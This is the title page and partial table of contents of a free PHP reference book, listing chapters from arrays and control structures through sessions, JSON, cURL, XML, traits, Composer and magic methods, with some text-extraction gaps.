PHP
Notes for ProfessionalsPHP
Notes for Professionals
GoalKicker.com
Free Programming BooksDisclaimer
This is an unocial free book created for educational purposes and is
not aliated with ocial PHP group(s) or company(s).
All trademarks and registered trademarks are
the property of their respective owners
400+ pages
of professional hints and tricks

Contents
About  1  ................................................................................................................................................................................... 
Section 11.2: Return by Reference  67  .............................................................................................................................. 
Section 11.3: Pass by Reference  68  ................................................................................................................................. 
Chapter 12: Arrays  71  ...................................................................................................................................................... 
Section 12.1: Initializing an Array  71  ................................................................................................................................ 
Section 12.2: Check if key exists  73  ................................................................................................................................. 
Section 12.3: Validating the array type  74  ..................................................................................................................... 
Section 12.4: Creating an array of variables  74  ............................................................................................................ 
Section 12.5: Checking if a value exists in array  74  ....................................................................................................... 
Section 12.6: ArrayAccess and Iterator Interfaces  75  ................................................................................................... 
Chapter 13: Array iteration  79  .................................................................................................................................... 
Section 13.1: Iterating multiple arrays together  79  ........................................................................................................ 
Section 13.2: Using an incremental index  80  .................................................................................................................. 
Section 13.3: Using internal array pointers  80  ............................................................................................................... 
Section 13.4: Using foreach  81  ......................................................................................................................................... 
Section 13.5: Using ArrayObject Iterator  83  ................................................................................................................... 
Chapter 14: Executing Upon an Array  84  .............................................................................................................. 
Section 14.1: Applying a function to each element of an array  84  .............................................................................. 
Section 14.2: Split array into chunks  85  .......................................................................................................................... 
Section 14.3: Imploding an array into string  86  ............................................................................................................. 
Section 14.4: "Destructuring" arrays using list()  86  ....................................................................................................... 
Section 14.5: array_reduce  86  ......................................................................................................................................... 
Section 14.6: Push a Value on an Array  87  ..................................................................................................................... 
Chapter 15: Manipulating an Array  89  .................................................................................................................... 
Section 15.1: Filtering an array  89  .................................................................................................................................... 
Section 15.2: Removing elements from an array  90  ..................................................................................................... 

Section 15.3: Sorting an Array  91  .................................................................................................................................... 
Section 15.4: Whitelist only some array keys  96  ........................................................................................................... 
Section 15.5: Adding element to start of array  96  ......................................................................................................... 
Section 15.6: Exchange values with keys  97  ................................................................................................................... 
Section 15.7: Merge two arrays into one array  97  ........................................................................................................ 
Chapter 16: Processing Multiple Arrays Together  99  ..................................................................................... 
Section 16.1: Array intersection  99  ................................................................................................................................... 
Section 16.2: Merge or concatenate arrays  99  .............................................................................................................. 
Section 16.3: Changing a multidimensional array to associative array  100  .............................................................. 
Section 16.4: Combining two arrays (keys from one, values from another)  100  ...................................................... 
Chapter 17: Datetime Class  102  ................................................................................................................................. 
Section 17.1: Create Immutable version of DateTime from Mutable prior PHP 5.6  102  ............................................ 
Section 17.2: Add or Subtract Date Intervals  102  .......................................................................................................... 
Section 17.3: getTimestamp  102  ..................................................................................................................................... 
Section 17.4: setDate  103  ................................................................................................................................................. 
Section 17.5: Create DateTime from custom format  103  ............................................................................................. 
Section 17.6: Printing DateTimes  103  .............................................................................................................................. 
Chapter 18: Working with Dates and Time  105  .................................................................................................. 
Section 18.1: Getting the dierence between two dates / times  105  .......................................................................... 
Section 18.2: Convert a date into another format  105  ................................................................................................. 
Section 18.3: Parse English date descriptions into a Date format  107  ........................................................................ 
Section 18.4: Using Predeﬁned Constants for Date Format  107  ................................................................................. 
Chapter 19: Control Structures  109  .......................................................................................................................... 
Section 19.1: if else  109  ..................................................................................................................................................... 
Section 19.2: Alternative syntax for control structures  109  .......................................................................................... 
Section 19.3: while  109  ...................................................................................................................................................... 
Section 19.4: do-while  110  ................................................................................................................................................ 
Section 19.5: goto  110  ...................................................................................................................................................... 
Section 19.6: declare  110  .................................................................................................................................................. 
Section 19.7: include & require  111  ................................................................................................................................. 
Section 19.8: return  112  .................................................................................................................................................... 
Section 19.9: for  112  ......................................................................................................................................................... 
Section 19.10: foreach  113  ................................................................................................................................................ 
Section 19.11: if elseif else  113  .......................................................................................................................................... 
Section 19.12: if  114  ........................................................................................................................................................... 
Section 19.13: switch  114  ................................................................................................................................................... 
Chapter 20: Loops  116  .................................................................................................................................................... 
Section 20.1: continue  116  ............................................................................................................................................... 
Section 20.2: break  117  ................................................................................................................................................... 
Section 20.3: foreach  118  ................................................................................................................................................ 
Section 20.4: do...while  118  .............................................................................................................................................. 
Section 20.5: for  119  ........................................................................................................................................................ 
Section 20.6: while  120  ..................................................................................................................................................... 
Chapter 21: Functions  121  ............................................................................................................................................. 
Section 21.1: Variable-length argument lists  121  ........................................................................................................... 
Section 21.2: Optional Parameters  122  .......................................................................................................................... 
Section 21.3: Passing Arguments by Reference  123  ..................................................................................................... 
Section 21.4: Basic Function Usage  124  ......................................................................................................................... 
Section 21.5: Function Scope  124  .................................................................................................................................... 

Chapter 22: Functional Programming  125  ............................................................................................................ 
Section 22.1: Closures  125  ................................................................................................................................................ 
Section 22.2: Assignment to variables  126  .................................................................................................................... 
Section 22.3: Objects as a function  126  ......................................................................................................................... 
Section 22.4: Using outside variables  127  ..................................................................................................................... 
Section 22.5: Anonymous function  127  .......................................................................................................................... 
Section 22.6: Pure functions  128  ..................................................................................................................................... 
Section 22.7: Common functional methods in PHP  128  ............................................................................................... 
Section 22.8: Using built-in functions as callbacks  129  ................................................................................................ 
Section 22.9: Scope  129  ................................................................................................................................................... 
Section 22.10: Passing a callback function as a parameter  129  ................................................................................. 
Chapter 23: Alternative Syntax for Control Structures  131  ........................................................................ 
Section 23.1: Alternative if/else statement  131  ............................................................................................................. 
Section 23.2: Alternative for statement  131  .................................................................................................................. 
Section 23.3: Alternative while statement  131  ............................................................................................................... 
Section 23.4: Alternative foreach statement  131  .......................................................................................................... 
Section 23.5: Alternative switch statement  132  ............................................................................................................. 
Chapter 24: String formatting  133  .......................................................................................................................... 
Section 24.1: String interpolation  133  ............................................................................................................................. 
Section 24.2: Extracting/replacing substrings  134  ....................................................................................................... 
Chapter 25: String Parsing  136  ................................................................................................................................... 
Section 25.1: Splitting a string by separators  136  ......................................................................................................... 
Section 25.2: Substring  136  ............................................................................................................................................. 
Section 25.3: Searching a substring with strpos  138  .................................................................................................... 
Section 25.4: Parsing string using regular expressions  139  ......................................................................................... 
Chapter 26: Classes and Objects  140  ...................................................................................................................... 
Section 26.1: Class Constants  140  ................................................................................................................................... 
Section 26.2: Abstract Classes  142  ................................................................................................................................. 
Section 26.3: Late static binding  144  .............................................................................................................................. 
Section 26.4: Namespacing and Autoloading  145  ........................................................................................................ 
Section 26.5: Method and Property Visibility  147  .......................................................................................................... 
Section 26.6: Interfaces  149  ............................................................................................................................................ 
Section 26.7: Final Keyword  152  ..................................................................................................................................... 
Section 26.8: Autoloading  153  ......................................................................................................................................... 
Section 26.9: Calling a parent constructor when instantiating a child  154  ................................................................ 
Section 26.10: Dynamic Binding  155  ............................................................................................................................... 
Section 26.11: $this, self and static plus the singleton  156  ............................................................................................ 
Section 26.12: Deﬁning a Basic Class  159  ...................................................................................................................... 
Section 26.13: Anonymous Classes  160  .......................................................................................................................... 
Chapter 27: Namespaces  162  ..................................................................................................................................... 
Section 27.1: Declaring namespaces  162  ....................................................................................................................... 
Section 27.2: Referencing a class or function in a namespace  162  ........................................................................... 
Section 27.3: Declaring sub-namespaces  163  ............................................................................................................... 
Section 27.4: What are Namespaces?  164  .................................................................................................................... 
Chapter 28: Sessions  165  ............................................................................................................................................... 
Section 28.1: session_start() Options  165  ...................................................................................................................... 
Section 28.2: Session Locking  165  .................................................................................................................................. 
Section 28.3: Manipulating session data  166  ................................................................................................................. 
Section 28.4: Destroy an entire session  166  .................................................................................................................. 

Section 28.5: Safe Session Start With no Errors  167  ..................................................................................................... 
Section 28.6: Session name  167  ...................................................................................................................................... 
Chapter 29: Cookies  169  ................................................................................................................................................. 
Section 29.1: Modifying a Cookie  169  ............................................................................................................................. 
Section 29.2: Setting a Cookie  169  ................................................................................................................................. 
Section 29.3: Checking if a Cookie is Set  170  ................................................................................................................ 
Section 29.4: Removing a Cookie  170  ............................................................................................................................ 
Section 29.5: Retrieving a Cookie  170  ............................................................................................................................ 
Chapter 30: Output Buering  171  ............................................................................................................................ 
Section 30.1: Basic usage getting content between buers and clearing  171  .......................................................... 
Section 30.2: Processing the buer via a callback  171  ................................................................................................ 
Section 30.3: Nested output buers  172  ........................................................................................................................ 
Section 30.4: Running output buer before any content  173  ..................................................................................... 
Section 30.5: Stream output to client  174  ...................................................................................................................... 
Section 30.6: Using Output buer to store contents in a ﬁle, useful for reports, invoices etc  174  .......................... 
Section 30.7: Typical usage and reasons for using ob_start  174  ............................................................................... 
Section 30.8: Capturing the output buer to re-use later  175  .................................................................................... 
Chapter 31: JSON  177  ...................................................................................................................................................... 
Section 31.1: Decoding a JSON string  177  ...................................................................................................................... 
Section 31.2: Encoding a JSON string  180  ...................................................................................................................... 
Section 31.3: Debugging JSON errors  183  ..................................................................................................................... 
Section 31.4: Using JsonSerializable in an Object  184  .................................................................................................. 
Section 31.5: Header json and the returned response  185  ........................................................................................... 
Chapter 32: SOAP Client  187  ........................................................................................................................................ 
Section 32.1: WSDL Mode  187  ......................................................................................................................................... 
Section 32.2: Non-WSDL Mode  187  ................................................................................................................................ 
Section 32.3: Classmaps  187  ........................................................................................................................................... 
Section 32.4: Tracing SOAP request and response  188  ............................................................................................... 
Chapter 33: Using cURL in PHP  190  .......................................................................................................................... 
Section 33.1: Basic Usage (GET Requests)  190  .............................................................................................................. 
Section 33.2: POST Requests  190  ................................................................................................................................... 
Section 33.3: Using Cookies  191  ...................................................................................................................................... 
Section 33.4: Using multi_curl to make multiple POST requests  192  ......................................................................... 
Section 33.5: Sending multi-dimensional data and multiple ﬁles with CurlFile in one request  193  ......................... 
Section 33.6: Creating and sending a request with a custom method  196  ................................................................ 
Section 33.7: Get and Set custom http headers in php  196  ......................................................................................... 
Chapter 34: Reﬂection  198  ........................................................................................................................................... 
Section 34.1: Feature detection of classes or objects  198  ............................................................................................ 
Section 34.2: Testing private/protected methods  198  ................................................................................................. 
Section 34.3: Accessing private and protected member variables  200  ..................................................................... 
Chapter 35: Dependency Injection  202  .................................................................................................................. 
Section 35.1: Constructor Injection  202  ........................................................................................................................... 
Section 35.2: Setter Injection  202  .................................................................................................................................... 
Section 35.3: Container Injection  204  ............................................................................................................................. 
Chapter 36: XML  205  ........................................................................................................................................................ 
Section 36.1: Create a XML using DomDocument  205  .................................................................................................. 
Section 36.2: Read a XML document with DOMDocument  206  ................................................................................... 
Section 36.3: Leveraging XML with PHP's SimpleXML Library  207  .............................................................................. 
Section 36.4: Create an XML ﬁle using XMLWriter  209  ................................................................................................. 

Section 36.5: Read a XML document with SimpleXML  210  .......................................................................................... 
Chapter 37: SimpleXML  212  .......................................................................................................................................... 
Section 37.1: Loading XML data into simplexml  212  ..................................................................................................... 
Chapter 38: Parsing HTML  213  ................................................................................................................................... 
Section 38.1: Parsing HTML from a string  213  ............................................................................................................... 
Section 38.2: Using XPath  213  ......................................................................................................................................... 
Section 38.3: SimpleXML  213  ........................................................................................................................................... 
Chapter 39: Regular Expressions (regexp/PCRE)  215  .................................................................................... 
Section 39.1: Global RegExp match  215  ......................................................................................................................... 
Section 39.2: String matching with regular expressions  216  ....................................................................................... 
Section 39.3: Split string into array by a regular expression  217  ................................................................................ 
Section 39.4: String replacing with regular expression  217  ......................................................................................... 
Section 39.5: String replace with callback  217  .............................................................................................................. 
Chapter 40: Traits  219  .................................................................................................................................................... 
Section 40.1: What is a Trait?  219  ................................................................................................................................... 
Section 40.2: Traits to facilitate horizontal code reuse  220  ......................................................................................... 
Section 40.3: Conﬂict Resolution  221  ............................................................................................................................. 
Section 40.4: Implementing a Singleton using Traits  222  ............................................................................................ 
Section 40.5: Traits to keep classes clean  223  .............................................................................................................. 
Section 40.6: Multiple Traits Usage  224  ......................................................................................................................... 
Section 40.7: Changing Method Visibility  224  ................................................................................................................ 
Chapter 41: Composer Dependency Manager  226  .......................................................................................... 
Section 41.1: What is Composer?  226  .............................................................................................................................. 
Section 41.2: Autoloading with Composer  227  .............................................................................................................. 
Section 41.3: Dierence between 'composer install' and 'composer update'  227  ..................................................... 
Section 41.4: Composer Available Commands  228  ....................................................................................................... 
Section 41.5: Beneﬁts of Using Composer  229  .............................................................................................................. 
Section 41.6: Installation  230  ............................................................................................................................................ 
Chapter 42: Magic Methods  231  ................................................................................................................................ 
Section 42.1: __call() and __callStatic()  231  ................................................................................................................. 
Section 42.2: __get(), __set(), __isset() and __unset()  232  ...................................................................................... 
Section 42.3: __construct() and __destruct()  233  ....................................................................................................... 
Section 42.4: __toString()  234  ........................................................................................................................................ 
Section 42.5: __clone()  235  ............................................................................................................................................ 
Section 42.6: __invoke()  235  ........................................................................................................................................... 
